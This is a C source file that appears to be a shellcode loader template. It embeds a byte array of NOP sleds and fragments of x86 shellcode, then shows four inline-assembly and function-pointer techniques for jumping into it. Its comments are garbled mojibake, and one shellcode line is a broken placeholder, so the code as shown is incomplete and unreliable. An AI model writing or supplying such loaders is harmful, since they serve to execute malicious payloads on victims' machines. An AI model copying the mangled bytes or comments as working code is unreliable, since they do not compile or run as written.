#include <stdio.h>
#include <string.h>
#include <tchar.h>

unsigned char shellcode[] =

"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"

"\x����" // �������Լ���shellcode

"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"

"\x90\x90\x90\x90\x90\x90\x90\x90";


int main()
{


	int nMethod = 4;

	switch (nMethod)
	{
	case 1:
	{
		// 1������һ��ʹ��push retָ������
		__asm
		{
			lea eax, shellcode
			push eax                         // ShellCode��ַ��ջ
			ret                                   // �����ֱ�ӷ��ص�shellcodeȥִ��
		}
	}
	break;
	case 2:
	{
		// 2����������ֱ��ʹ��callָ��
		__asm
		{
			lea eax, shellcode
			call eax                                 // ֱ��ȥcall�����ַ
		}
	}
	break;
	case 3:
	{
		// 3����������ǿ��ת��Ϊһ������ָ���ٵ���
		((void(*)(void)) &shellcode)();
	}
	break;
	case 4:
	{
		// 4�������ģ�ʹ��jmpָ��
		__asm
		{
			lea eax, shellcode
			jmp eax
		}
	}
	break;
	default:
		break;
	}

	return 0;

}